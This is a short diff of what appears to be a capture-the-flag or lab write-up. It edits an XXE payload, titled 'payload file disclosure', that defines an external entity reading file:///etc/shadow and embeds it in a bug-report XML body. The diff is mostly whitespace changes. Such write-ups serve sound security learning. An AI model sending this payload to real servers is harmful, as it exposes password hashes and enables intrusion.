@@ -42,14 +42,13 @@ Yields
 		</bugreport>
 
 #### payload file disclosure:
-
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
-    <bugreport>
-    <title>&ent;</title>
-    <cwe>test</cwe>
-    <cvss>test</cvss>
-    <reward>rest</reward>
-    </bugreport>
+    		<bugreport>
+    		<title>&ent;</title>
+    		<cwe>test</cwe>
+    		<cvss>test</cvss>
+    		<reward>test</reward>
+    		</bugreport>
 
 Obtain Username: ${UN}
